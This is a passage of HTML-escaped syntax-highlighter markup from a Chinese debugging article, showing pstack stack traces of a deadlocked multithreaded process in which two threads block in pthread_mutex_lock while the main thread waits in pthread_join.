&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#6  0x0000003d19cd40cd in clone () from /lib64/libc.so.6 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a0778e253008467-18&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x43239940&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;LWP&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;6724&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a0778e253008467-19&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#0  0x0000003d19c9a541 in nanosleep () from /lib64/libc.so.6 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a0778e253008467-20&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#1  0x0000003d19c9a364 in sleep () from /lib64/libc.so.6 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a0778e253008467-21&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#2  0x00000000004009bc in thread3(void*) () &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a0778e253008467-22&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#3  0x0000003d1a80673d in start_thread () from /lib64/libpthread.so.0 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a0778e253008467-23&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#4  0x0000003d19cd40cd in clone () from /lib64/libc.so.6 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a0778e253008467-24&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x43c3a940&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;LWP&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;6725&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a0778e253008467-25&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#0  0x0000003d19c9a541 in nanosleep () from /lib64/libc.so.6 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a0778e253008467-26&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#1  0x0000003d19c9a364 in sleep () from /lib64/libc.so.6 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a0778e253008467-27&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#2  0x0000000000400976 in thread4(void*) () &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a0778e253008467-28&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#3  0x0000003d1a80673d in start_thread () from /lib64/libpthread.so.0 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a0778e253008467-29&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#4  0x0000003d19cd40cd in clone () from /lib64/libc.so.6 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a0778e253008467-30&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x2b984ecabd90&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;LWP&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;6721&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a0778e253008467-31&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#0  0x0000003d1a807b35 in pthread_join () from /lib64/libpthread.so.0 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a0778e253008467-32&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#1  0x0000000000400900 in main ()&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0037 seconds] --&gt;

&lt;/div&gt;
&lt;h5 id=&quot;listing5&quot;&gt;清单 5. 对死锁进程第二次执行 pstack（pstack –进程号）的输出结果&lt;/h5&gt;
&lt;div&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a973a07792930208225&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
 [dyu@xilinuxbldsrv purify]$ pstack 6721 
 Thread 5 (Thread 0x40bd6940 (LWP 6722)): 
 #0  0x0000003d1a80d4c4 in __lll_lock_wait () from /lib64/libpthread.so.0 
 #1  0x0000003d1a808e1a in _L_lock_1034 () from /lib64/libpthread.so.0 
 #2  0x0000003d1a808cdc in pthread_mutex_lock () from /lib64/libpthread.so.0 
 #3  0x0000000000400a87 in func1() () 
 #4  0x0000000000400ac3 in thread1(void*) () 
 #5  0x0000003d1a80673d in start_thread () from /lib64/libpthread.so.0 
 #6  0x0000003d19cd40cd in clone () from /lib64/libc.so.6 
 Thread 4 (Thread 0x415d7940 (LWP 6723)): 
 #0  0x0000003d1a80d4c4 in __lll_lock_wait () from /lib64/libpthread.so.0 
 #1  0x0000003d1a808e1a in _L_lock_1034 () from /lib64/libpthread.so.0 
 #2  0x0000003d1a808cdc in pthread_mutex_lock () from /lib64/libpthread.so.0 
 #3  0x0000000000400a03 in func2() () 
 #4  0x0000000000400a3f in thread2(void*) () 
 #5  0x0000003d1a80673d in start_thread () from /lib64/libpthread.so.0 
 #6  0x0000003d19cd40cd in clone () from /lib64/libc.so.6 
 Thread 3 (Thread 0x41fd8940 (LWP 6724)): 
 #0  0x0000003d19c7aec2 in memset () from /lib64/libc.so.6 
 #1  0x00000000004009be in thread3(void*) () 
 #2  0x0000003d1a80673d in start_thread () from /lib64/libpthread.so.0 
 #3  0x0000003d19cd40cd in clone () from /lib64/libc.so.6 
 Thread 2 (Thread 0x429d9940 (LWP 6725)): 
 #0  0x0000003d19c7ae0d in memset () from /lib64/libc.so.6 
 #1  0x0000000000400982 in thread4(void*) () 
 #2  0x0000003d1a80673d in start_thread () from /lib64/libpthread.so.0 
 #3  0x0000003d19cd40cd in clone () from /lib64/libc.so.6 
 Thread 1 (Thread 0x2af906fd9d90 (LWP 6721)): 
 #0  0x0000003d1a807b35 in pthread_join () from /lib64/libpthread.so.0 
 #1  0x0000000000400900 in main ()&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07792930208225-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07792930208225-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07792930208225-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07792930208225-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07792930208225-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07792930208225-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07792930208225-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07792930208225-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07792930208225-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07792930208225-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07792930208225-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07792930208225-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07792930208225-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07792930208225-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07792930208225-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07792930208225-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07792930208225-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07792930208225-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07792930208225-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07792930208225-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07792930208225-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07792930208225-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07792930208225-23&quot;&gt;23&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07792930208225-24&quot;&gt;24&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07792930208225-25&quot;&gt;25&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07792930208225-26&quot;&gt;26&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07792930208225-27&quot;&gt;27&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07792930208225-28&quot;&gt;28&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a973a07792930208225-29&quot;&gt;29&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a973a07792930208225-30&quot;&gt;30&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07792930208225-1&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dyu&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;xilinuxbldsrv &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;purify&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;pstack&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;6721&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07792930208225-2&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x40bd6940&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;LWP&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;6722&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07792930208225-3&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#0  0x0000003d1a80d4c4 in __lll_lock_wait () from /lib64/libpthread.so.0 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07792930208225-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#1  0x0000003d1a808e1a in _L_lock_1034 () from /lib64/libpthread.so.0 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07792930208225-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#2  0x0000003d1a808cdc in pthread_mutex_lock () from /lib64/libpthread.so.0 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07792930208225-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#3  0x0000000000400a87 in func1() () &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07792930208225-7&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#4  0x0000000000400ac3 in thread1(void*) () &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07792930208225-8&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#5  0x0000003d1a80673d in start_thread () from /lib64/libpthread.so.0 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07792930208225-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#6  0x0000003d19cd40cd in clone () from /lib64/libc.so.6 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07792930208225-10&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x415d7940&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;LWP&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;6723&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07792930208225-11&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#0  0x0000003d1a80d4c4 in __lll_lock_wait () from /lib64/libpthread.so.0 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07792930208225-12&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#1  0x0000003d1a808e1a in _L_lock_1034 () from /lib64/libpthread.so.0 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07792930208225-13&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#2  0x0000003d1a808cdc in pthread_mutex_lock () from /lib64/libpthread.so.0 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07792930208225-14&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#3  0x0000000000400a03 in func2() () &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07792930208225-15&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#4  0x0000000000400a3f in thread2(void*) () &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07792930208225-16&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#5  0x0000003d1a80673d in start_thread () from /lib64/libpthread.so.0 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07792930208225-17&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#6  0x0000003d19cd40cd in clone () from /lib64/libc.so.6 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07792930208225-18&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x41fd8940&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;LWP&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;6724&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07792930208225-19&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#0  0x0000003d19c7aec2 in memset () from /lib64/libc.so.6 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07792930208225-20&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#1  0x00000000004009be in thread3(void*) () &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07792930208225-21&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#2  0x0000003d1a80673d in start_thread () from /lib64/libpthread.so.0 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a973a07792930208225-22&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-p&quot;&gt;#3  0x0000003d19cd40cd in clone () from /lib64/libc.so.6 &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a973a07792930208225-23&quot;&gt;
